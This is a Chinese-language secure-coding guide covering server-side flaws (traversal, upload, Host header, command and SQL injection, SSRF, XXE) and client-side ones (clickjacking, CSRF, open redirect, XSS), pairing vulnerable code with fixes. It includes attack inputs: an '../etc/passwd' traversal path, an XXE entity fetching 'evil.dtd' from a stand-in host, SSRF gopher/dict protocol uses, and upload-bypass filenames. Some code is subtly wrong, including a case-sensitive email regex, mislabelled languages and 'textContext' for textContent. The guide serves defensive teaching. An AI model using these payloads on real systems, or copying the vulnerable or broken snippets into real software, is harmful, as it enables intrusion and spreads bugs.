服务端
===

### 1.身份认证

#### 封装错误信息

为防止认证过程中的信息泄露，错误提示应当确保**尽可能少且简明**。还应注意使用相同的 HTTP 响应码。

例如：不明示用户名错误，或者密码错误。

危险代码：

```js
...
// Validating the existence of a user with the specified email.
const existingUser = await User.findOne({ email });
if (!existingUser) {
    return res
        .status(401)
        .json({ errorMessage: "Invalid email." });
}

// Validating the password attributed to that User object with the passwordHash
// from the database.
const passwordCorrect = await bcrypt.compare(password, existingUser.passwordHash);
if (!passwordCorrect) {
    return res
        .status(401)
        .json({ errorMessage: "Password is invalid for the given email." });
}
...
```

这段代码显然是有问题的。明示的`用户名错误`可以让攻击者通过观察错误信息的变化发起暴力破解。

因此正确做法是尽可能提供少的错误信息，同时能让用户知道发生了错误。

一个好的选择可以是：只返回`无效的用户名或密码`字样。

```js
...
// Validating the existence of a user with the specified email.
const existingUser = await User.findOne({ email });
if (!existingUser) {
    return res
        .status(401)
        .json({ errorMessage: "Invalid email or password." });
}

// Validating the password attributed to that User object with the passwordHash
// from the database.
const passwordCorrect = await bcrypt.compare(password, existingUser.passwordHash);
if (!passwordCorrect) {
    return res
        .status(401)
        .json({ errorMessage: "Invalid email or password." });
}
...
```

还有一个例子：重置密码接口。不要返回**“我们刚刚向您发送了一个密码重置链接”**，更好的方案是”**如果该电子邮件地址在我们的数据库中，我们将向您发送一封电子邮件以重置您的密码**“。

#### 用户标识

用户的唯一标识（用户名/用户ID）要是服务端随机生成的，而不是用户定义的数据，且尽量使用非连续id，降低攻击者的遍历成本。

#### 邮箱验证

用户注册时通常会验证邮箱，此时需要严格验证邮箱地址。

无效邮件发送会导致ISP，也就是你的域名在该邮箱服务商的信誉度下降，甚至可能接被服务商拉入黑名单，用户根本就接收不到你的邮件。同时无效邮箱占用大量的发送额度，造成浪费。

一个简单高效的验证邮箱的方式：正则判断邮箱格式 + 查找邮箱域的 MX 记录。

```python
import dns.resolver
import re

def checkFormat(email):
  #email regex 
  regex = '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b'
  if re.search(regex, email):
    return True
  else:
    return False

def checkEmailValid(email):
  if checkFormat(email):
    domain = email.split("@")[1] # 'bobi.io'
    for _ in dns.resolver.query(domain, 'MX'):
      return True
  return False

email = "vlad@bobi.io"
checkEmailValid(email) # True
```

#### 密码

不用多说，肯定要强密码策略的。

Hash（单向函数）和加密（双向函数）都提供了保护密码的方法。无论哪种情况**密码都应该使用Hash，而不是加密。**

#### 验证码

增加暴力破解攻击成本的最有效方法就是验证码。

#### 日志和监控

启用身份验证功能的日志记录和监控，以实时检测攻击/故障。应该记录：

- 报错日志
- 登录失败日志
- 账户锁定日志

### 2.目录遍历

#### 漏洞成因

目录遍历允许攻击者读取运行应用程序的服务器上的任意文件。通常包括应用程序源代码、数据、配置文件、凭证、敏感的操作系统文件。如果有任意写权限，可直接导致服务器沦陷。

#### 危险代码

```java
private static final String BASE_PATH = "/storage/items/images";
private void getProfileImage(HttpServletRequest request, 
HttpServletResponse response) throws IOException {
    String folderName = request.getParameter("folder");
    String fileName = request.getParameter("file");
    String path = BASE_PATH + folderName + fileName;
    File file = new File(path);
    buildResponse(response, file);
}
```

文件路径构建为`BASE_PATH` + 请求接收的**文件夹**名称 + **文件名称**

攻击者可以在文件名中输入相对路径，例如`../../../etc/passwd`（UNIX 系统），路径拼接后为`/storage/items/images/../../../etc/passwd`，然后经过系统规范化后为`/etc/passwd`，导致`passwd`文件泄露。

#### 如何避免

1. 最有效的方式：完全避免将用户提供的输入传递给文件系统 API。
2. 如果不可避免，应用程序应该对用于文件系统操作的**参数**执行严格的**输入验证**。这些包括路径验证和用户提供数据的绝对路径检查。
    
    ```php
    private static final String BASE_PATH = "/storage/items/images";
    
    private void getProfileImage(HttpServletRequest request, 
    HttpServletResponse response) throws IOException {
    
       String folderName = request.getParameter("folder");
       String fileName = request.getParameter("file");
       String path = BASE_PATH + folderName + fileName;
    
       File file = new File(path);
    
       String canonicalPath = file.getCanonicalPath();
    
       // Check whether the given path corresponds to the base path
       //(where the image files are stored)
       if(canonicalPath.startsWith(BASE_PATH)) {
           buildResponse(response, file);
       } else {
           throw new GenericException("Access denied.");
       }
    }
    ```
3. 使用文件托管服务：CDN/云服务。
4. 间接的文件引用。为每个文件分配一个与文件**路径**相对应的任意 ID，然后让**所有 URL 通过该 ID 引用每个文件**。例如，可以**使用数据库**来完成（保留**文件路径**与其**相对 id**之间的引用）

### 3.文件上传

#### 漏洞成因

在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件（恶意脚本、webshell）。`文件上传`本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。

#### 如何避免

最佳方案：确保Web 服务器将上传的文件视为惰性对象而不是可执行对象。因此可以选择将上传的文件存储到CDN/云存储，或者存储到不同服务器（即便与web服务在同一服务器，也应当存储在webroot之外）。

如果不可避免，要将文件上传到本地磁盘，应该做到：

- 文件重命名：改为随机生成的名称。
- 存文件的目录没有执行权限，如果没有读需求就只配置写权限。
    
    ```python
    import os
    
    file_f = os.open("/path/to/your/file", os.O_WRONLY | os.O_CREAT, 0o600)
    
    with os.fdopen(open(file_f, "wb")) as file_handling:
      file_handling.write(...)
    ```
- 黑名单/白名单的方式验证扩展名和MIME：确保在解码文件名后进行验证，设置适当的过滤器避免已知的绕过。例如：
    
    
    - 双重扩展，*例如* `.jpg.php`，它很容易绕过**正则表达式** `\.jpg.`
    - 空字节，*例如* `.php%00.jpg`， where`.jpg`被截断并`.php`成为新的扩展名。
    - 自定义的正则。非常不建议自己构建正则验证。
- 验证文件内容：
- 完全不推荐上传**ZIP**文件，因为它们实际上可以包含任何类型的文件，因此允许无限。
- 验证文件类型：不是Content-Type头，因为可以修改。
- 防病毒软件或沙箱运行文件以验证它不包含恶意数据
- 注意CSRF
- 文件大小限制：避免DOS

### 4.Host头注入

#### 漏洞成因

Host头是用户可控的。如果服务器隐式信任 Host 标头，并且未能正确验证或转义它，则攻击者能够利用Host头向服务器端注入有害的payload。例如：

- Web 缓存中毒。
- 特定功能中的业务[逻辑缺陷](https://portswigger.net/web-security/logic-flaws)。
- 基于路由的 SSRF。
- 经典的服务器端漏洞，例如 SQL 注入。

#### 危险代码

```java
public void resetPasswordLink(HttpServletRequest request) {

    // retrieves the host from the request header
    String host = request.getHeader("Host");

    String email = request.getParameter("email");
    HttpSession session = request.getSession();

    if (session != null) {
        String token = generateResetToken(email);

        // Password reset link is constructed with the retrieved host
        // for the token that has just been generated.
        StringBuilder resetLinkBuilder = new StringBuilder()
                .append(host)
                .append("?reset")
                .append(token);

        // Send the email
        sendEmail(email, resetLinkBuilder.toString());
    }
}
```

Host头没有任何过滤和校验，而且生成的访问链接直接拼接了Host头。如果攻击者拦截了请求并修改了Host，生成的访问链接的Host是攻击者修改后的，攻击者将收到密码重置token的token。

#### 如何避免

1. 完全避免代码逻辑使用Host头。大多数情况下都可使用相对路径的URL代替。
2. 如果不可避免使用绝对路径，也应该从配置文件中获取。
3. 即便不从配置文件中获取，要配置允许的域白名单。不要使用黑名单，因为太好绕过了：[ip变形](http://blog.leanote.com/post/snowming/aefd7a947bd0)、短连接、进制转换、ipv6绕过等等。

### 5.命令注入

#### 漏洞成因

命令注入允许攻击者在运行应用程序的服务器上执行任意操作系统 (OS) 命令。

#### 危险代码

```python
import os
import sys

file = sys.argv[1]
text = os.system("cat " +  file)
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a28e60cab41f8a860db8ded1ed4f623f7840e876.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a28e60cab41f8a860db8ded1ed4f623f7840e876.png)

#### 如何避免

1. 避免直接调用操作系统命令。尽量使用语言自带的内置函数。例如使用`os.mkdir(dir_name)`代替`os.system("mkdir " + dir_name)`
2. 如果不可避免要直接调用系统命令。可以通过： 
    - 转义操作系统命令参数：例如 php 的 `system('ls '.escapeshellarg($dir));`
    - 系统权限控制：最小的运行权限 + 允许的命令白名单

### 6.ssrf

#### 漏洞成因

服务端的出站请求通常在调用第三方 API或引入第三方资源。如果限制不严格的话，**服务器端请求伪造**（也称为 SSRF）可允许攻击者诱导服务器端向攻击者控制的**的任意域**发出**HTTP 请求**，从而可能泄露敏感数据，例如授权凭据。

#### 挖掘与检测

利用点：

- 数据层面：关注域名、URL、IP、链接等。例如：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain等。
- 业务层面：关注任何通过http进行资源调用的功能。例如：通过url上传下载、内容展示、社交分享、在线翻译、收藏、WebMail、各种处理工具（FFpmg）等。

检测：

- 请求包中将参数更改为不同的IP / DNS或TCP端口，观察返回包长度、返回码、返回信息及响应时间，不同则可能存在SSRF漏洞；
- 结合dnslog/weblog

利用过程中的一些协议：

```php
http://：探测内网主机存活、端口开放情况
gopher://：发送GET或POST请求；攻击内网应用，如FastCGI、Redis
dict://：泄露安装软件版本信息，查看端口，操作内网redis访问等
file://：读取本地文件
```

#### 危险代码

```php
<?php
    if ( isset ( $ _GET [ ' url' ])){
         $ url = $ _GET [ 'url' ];
        $ image = fopen ( $ url , 'rb' );
        header ( "Content-Type: image/png" );
        fpassthru ( $ image );
    }
...
```

#### 如何避免

1. 为应用程序必须请求的域设置白名单
2. 从代码本身/配置文件配置外部api调用，而不是从url中获取
3. 防火墙配置出站请求白名单
4. 内网隔离

### 7.sql注入

#### 漏洞成因

sql拼接导致的sql执行。

#### 危险代码

```php
def authenticate(request):
    email = request.POST['email']
    password = request.POST['password']
    sql = "select * from users where (email ='" 
        + email 
        + "' and password ='" + password + "')"

    cursor = connection.cursor()
    cursor.execute(sql)
    row = cursor.fetchone()
    if row:
        loggedIn = "Auth successful"
    else:
        loggedIn = "Auth failure"
    return HttpResponse("Logged In Status: " + loggedIn)
```

#### 如何避免

- 参数化查询能解决大多数问题
- 校验数据类型
- 数据长度的最大值和最小值

```php
def authenticate(request):
    email = request.POST['email']
    password = request.POST['password']

    cursor = connection.cursor()
    cursor.execute("select * from users where(email = %s and password = %s)"
    , [email, password])
    row = cursor.fetchone()
    if row:
        loggedIn = "Auth successful"
    else:
        loggedIn = "Auth failure"
    return HttpResponse("Logged In Status: " + loggedIn)
```

### 8.xxe

#### 漏洞成因

xml文档结构：

1. 文档说明
2. 文档类型定义，也就是DTD，XXE 漏洞所在的地方
3. XML文档元素

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6330e8e7c25bce946e53c8e2bf0cd448fafb33cd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6330e8e7c25bce946e53c8e2bf0cd448fafb33cd.png)

DTD实体：用于定义快捷方式的变量。实体可在内部或外部进行声明。

内部实体

```php
<!ENTITY 实体名称 "实体的值">
```

外部实体：引入外部资源。有`SYSTEM`和`PUBLIC`两个关键字，表示实体来自本地还是其他服务器。

例如以下协议：

```php
file:///path/to/file.ext
http://url/file.ext
php://filter/read=convert.base64-encode/resource=conf.php
```

```php

<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
%xxe;]>
<foo>&amp;evil;</foo>
```

包含**对外部实体**的**引用的**不受信任的 XML 输入**被弱配置的 XML 解析器处理**时，就会发生这种攻击。

从解析器所在机器的角度来看，可能会导致：

- 机密数据泄露（读服务器文件 `file://`）
- 拒绝服务（好进内存，整个结构都保留在内存中，解析非常慢）
- [服务器端请求伪造](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)（SSRF）

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5f0e80fe22f75a58316299f1a53c9a54b9c40cb8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5f0e80fe22f75a58316299f1a53c9a54b9c40cb8.png)

- 端口扫描以及其他系统影响

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0af07e971dedff41817ea04340f56d340f467e7b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0af07e971dedff41817ea04340f56d340f467e7b.png)

#### 危险代码

```php
from django.http import HttpResponse
from lxml import etree

def authenticate(content):
        // 解析外部实体
    parser = etree.XMLParser(resolve_entities=True)
    try:
        document = etree.fromstring(content, parser)
    except etree.XMLSyntaxError:
        return None
```

XXE 允许外部XML资源，在XML文档中加载。

#### 缓解措施

1. 禁用DTD
2. 禁止外部实体解析

```php
from django.http import HttpResponse
from lxml import etree

def authenticate(content):
    parser = etree.XMLParser(resolve_entities=False)
    # False -> doesn't allow DOCTYPE declarations
    try:
        document = etree.fromstring(content, parser)
    except etree.XMLSyntaxError:
        return None
```

客户端
---

### 1.点击劫持

#### 漏洞成因

点击劫持（Click Jacking）是一种视觉上的欺骗手段，攻击者通过使用一个透明的iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，通过调整iframe页面的位置，可以使得伪造的页面恰好和iframe里受害页面里一些功能重合（按钮），以达到窃取用户信息或者劫持用户操作的目的。

点击劫持是仅次于xss和csrf的客户端漏洞。点击劫持的出发点是点击事件，而csrf通常是无感知的。

#### 如何避免

- 配置 X-Frame-Options 头 
    - **DENY：** 防止任何域对内容进行框架化。建议使用“拒绝”设置，除非确定了特定的取景需求。
    - **SAMEORIGIN：**仅允许当前站点对内容进行框架化。
    - **ALLOW-FROM URI：**允许指定的“ **URI** ”来构建此页面。
- 使用CSP：内容安全策略 (CSP) 是一种检测和预防机制，可缓解XSS和点击劫持。CSP 通常在 Web 服务器中作为以下形式的标题实现：**`Content-Security-Policy: policy`**。 
    - Content-Security-Policy: **`frame-ancestors 'self'`** 类似于 X-Frame-Options**`sameorigin`**。
    - Content-Security-Policy: **`frame-ancestors 'none'`**类似于 X-Frame-Options**`deny`**。
    - Content-Security-Policy:**`frame-ancestors 'xxx'`**类似于 X-Frame-Options**`allow-from`**。

### 2.csrf

#### 漏洞成因

跨站请求伪造（也称为**CSRF**）是一种 Web 安全漏洞，允许攻击者诱使用户执行他们不打算执行的操作。在通常的攻击场景中，**`GET`**改变被利用的服务器状态的请求。

#### 如何避免

- 遵循restful结构：**REST**或**Representational State Transfer**规定，**`GET`**在获取数据或其他资源时应严格使用请求，而对于任何其他实质上会改变服务器状态的操作，**应该**使用适当的协议之一，例如**`PUT`**、**`POST`**和**`DELETE`**。
- csrf token：这是最推荐的正确缓解 CSRF 的方法之一。没有token就无法向后端创建任何有效请求。token一定是唯一的、私密的、不可预测的。
- 验证码
- 验证referer

```php
<form action="/process" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">

  Favorite color: <input type="text" name="favoriteColor">
  <button type="submit">Submit</button>
</form>
```

### 3.开放跳转

#### 漏洞成因

当 Web 应用程序将请求重定向到由接受任意输入给出的 URL 时，可能出现此漏洞。

通过修改恶意站点的任意 URL 输入，攻击者可以成功发起网络钓鱼诈骗并窃取用户凭据等等。

#### 危险代码

```java
...
response.sendRedirect(request.getParameter("url"));
...
```

#### 如何避免

- 避免使用重定向和转发
- 即使使用，url不应该由用户控制。
- 如果无法避免由用户输入，也应该验证输入。确保用户输入的**值**有效、适用于应用程序，并且已为用户**授权**。
- 创建授信url白名单
- **强制所有重定向首先通过一个页面，**通知用户**他们将离开网站**，并清楚地显示目的地，然后让**他们单击链接进行确认。**

### 4.session劫持

#### 漏洞成因

会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户。

获取session id的手段：

- 爆破
- 预测：非随机产生时，可以计算
- 窃取：xss

#### 如何避免

- 设置httponly
- 非透明化传输session id：session id 使用cookie存放，不可通过url传递

### 5.xss

浏览器会执行出现在任何网页上的任何 JavaScript 代码。由于跨站脚本攻击是一种非常常见的攻击方式，我们可以将其分为三种类型：

#### 存储XSS

##### 漏洞成因

是将脚本永久存储在目标服务器上，例如在数据库、消息论坛、访问者日志、评论字段等中。然后，受害者在请求时成为来自服务器的恶意脚本的目标其存储的信息。

##### 如何避免

- 转义 HTML 字符：转义来自数据库的所有动态内容，以便浏览器解释HTML 标签**的内容**，而不是将整个内容解释为原始 HTML。
    
    
    - 浏览器已经构建了页面的DOM，使得其将**不会**执行该`<script>`标签。由于跨站点脚本是一个如此**常见的** **漏洞**，现代**前端框架**很可能默认情况下**已经转义动态内容**。通常，视图中的**字符串**变量会自动转义。
    - 虽然**前端框架往往已经对动态内容进行了转义，**但这仅限于实际**显示它**。如果`<a href={...} />, <img src={...} />`在开发人员内部存在使用该内容的情况，则应**采取其他防御措施**确保检索到的数据被正确转义。
- CSP：浏览器允许网站设置内容安全策略，您可以使用它来**锁定**网站上的**JavaScript 执行**。限制一个页面的脚本导入到一个非常基本的政策**相同的域**（`self`），并告诉浏览器**内联的JavaScript**应该**不**被执行。
    
    ```php
    Content-Security-Policy: script-src 'self' https://scripts.github.com
    ```

#### 反射XSS

##### 漏洞成因

**反射攻击**是指注入的脚本从 Web 服务器反射出来的**攻击**，例如报错、搜索或任何其他包含请求的部分或全部用户输入部分的响应。当受害者被诱骗**点击恶意链接**、提交特制表单，用户访问时浏览器将从恶意平台拉取js执行。

##### 如何避免

- 无论动态内容来自后端/数据库还是 HTTP 请求本身，都**以相同的方式进行转义**。现在幸运的是，现代前端模板逃避了所有变量，关于它们来自哪里（HTTP 请求或后端）。

#### DOMXSS

##### 漏洞成因

当**JS**从攻击者可控制的来源（例如 URL）获取数据并将其传递到支持动态代码执行的接收器（例如`eval()`或 ）时，通常会出现**基于 DOM 的 XSS 漏洞**`innerHTML`。

例如：在没有任何输入验证的情况下将参数值的值附加到 DOM

```php
document.getElementById('currentItemName').innerHTML = type; 
```

##### 如何避免

- 转义用户输入 escape。
- 使用`textContext`代替，`innerHTML`。`textContext`将转义 HTML 标记字符。
    
    ```php
    document.getElementById('currentItemName').textContext = escapeHTML(type); 
    ```

#### 总结

动态内容均经过被转义 + 启用CSP。

参考文档
----

- <https://portswigger.net/web-security>
- <https://owasp.org/www-community/attacks/>
- <https://github.com/joswha/Secure-Coding-Handbook>